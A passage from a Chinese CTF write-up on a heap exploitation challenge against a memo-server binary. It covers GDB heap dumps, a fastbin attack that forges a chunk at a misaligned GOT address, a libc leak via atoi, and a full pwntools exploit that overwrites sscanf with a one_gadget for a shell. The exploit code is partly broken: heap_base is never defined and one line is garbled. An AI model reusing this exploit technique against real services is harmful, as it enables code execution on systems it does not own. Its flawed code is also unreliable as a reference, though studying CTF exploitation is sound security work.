    0x12b5040:  0x0000000000000000  0x0000000000000021  add('aaaaaaaa\x21',1)
看堆情况：
    0x1299080:  0x0000000000000000  0x0000000000000021
    0x1299090:  0x00000000012990b0  0x0000000000000000
    0x12990a0:  0x0000000000000000  0x0000000000000021
    0x12990b0:  0x00000000012990f0  0x0000000000000001
    0x12990c0:  0x0000000000000000  0x0000000000000021
    0x12990d0:  0x00000000012990f0  0x0000000000000000
    0x12990e0:  0x0000000000000000  0x0000000000000021
    0x12990f0:  0x6161616161616161  0x0000000000000021
    fastbins
    0x20: 0x12990a0 —▸ 0x12990f0
这时候第二个`fastbin`为0x12990f0，所以`memo=`的内容就会被分配在0x1299100处，而0x1299100处恰好是一个之前所分配的堆，所以可以用这点来泄漏libc地址了。继续`add`一个：
> add('b' _8+'\x21'_ 8+p64(elf.got['atoi']).replace('\x00',''),12345)
堆情况：
    0x1bcf0c0:  0x0000000000000000  0x0000000000000021  memset(&s2, 0, 0x50uLL);
所以这里行不通，只能在got表地址处找一处错位地址：
    pwndbg> x/20xg 0x60306a
    0x60306a:   0x0ac600007f08c728  0x1130000000000040
    0x60307a:   0x8ad000007f08c727  0xce7000007f08c725
    0x60308a:   0x0b0600007f08c725  0xb660000000000040
    0x60309a:   0x3e8000007f08c727  0x294000007f08c722
刚好有一处0x40大小的可构造堆，且`__isoc99_sscanf`处于`0x603080`地址处可覆写。
大家复现后会发现这里有一处想不到的地方（反正我是想不到），就是要构造0x30大小的`memo`内容的时候，该如何既让堆`fd`指针处是我们所要构造的0x60306a，又要让0x30内容被填充满且中间还不能输入00字符串？（该程序如果memo=后的内容有00字符串则会崩溃，但是要构造0x60306a地址内容就必须有5个00字符串）
这里看了别人的wp后发现他们是这样构造的：
    add(urllib.quote(flat(0x60306a).ljust(0x30, 'A')),1234)
实际调试发现：
    0x1f151e0:  0x0000000000000000  0x0000000000000041
    0x1f151f0:  0x000000000060306a  0x4747474747474747
    0x1f15200:  0x4747474747474747  0x4747474747474747
    0x1f15210:  0x4747474747474747  0x4747474747474747
确实能写入，并且后面的内容不变为'A'。我查了一下这个quote函数不过是个`url`编码函数，为什么还能有这种效果。。如果有人清楚原理请告诉我一下。。
还有这里需要注意的一个点是在`free`堆的时候因为程序是开了多线程的，所以需要有一定的延时，不然会导致没有运行完整个`count`函数代码就进入下一个环节，会导致没有`free`掉堆的情况。
## EXP:
    from pwn import *
    import urllib
    p = process('./pwn')
    libc = ELF('libc-so.6')
    elf = ELF('pwn')
    context.log_level = 'debug'
    def add(content,index):
        s = 'POST '+'/add '+'Connection: keep-alive'
        s += '\n\n'+'memo='+content+'&count='+str(index)
        p.sendline(s)
    def count():
        s = 'POST '+'/count '+'Connection: keep-alive'
        p.sendline(s)
    def listlist():
        s = 'GET '+'/list '+'Connection: keep-alive'
        p.sendline(s)
    add('A'*8,1)
    add('B'*8,1)
    add('C'*8,1)
    add('D'*8,1)
    add('E'*0x30,1)
    add('F'*0x30,1)
    add('G'*0x30,1)
    add('H'*0x30,1)
    add('F'*24,123456)
    sleep(1)
    count()
    sleep(2)
    listlist()
    p.recvuntil('0')
    p.recvuntil('')
    data = p.recvuntil('0')
    data2 = u64(p.recv(6).ljust(8,'\x00'))
    atoi_addr = data2
    libc_base = atoi_addr - libc.symbols['atoi']
    one_gadget = libc_base + 0x45216
    log.success('atoi addr is:'+hex(atoi_addr))
    log.success('onegadget addr is:'+hex(one_gadget))
    add(p64(heap_base+0x180).replace('\x00',''),1)
    count()
    sleep(2)
    add(urllib.quote(flat(0x60306a).ljust(0x30, 'A')),1234)
    add(urllib.quote(flat(0x60306a).ljust(0x30, 'A')),1234)
    add(urllib.quote(flat(0x60306a).ljust(0x30, 'A')),1234)
    add('A'*6+urllib.quote(flat(p64(one_gadget)).ljust(0x30-14, 'A')),1234)
    sleep(0.1)
    p.sendline('V1NKe is a stupid boy!')
    p.interactive()
## 最后：
本人的exp写的较为粗糙，在泄漏heap基地址的时候因为对正则了解较少，所以有时候会出现没有正确计算出heap基地址的情况，解决方法是多试几次即可，或者自行修改成正则匹配。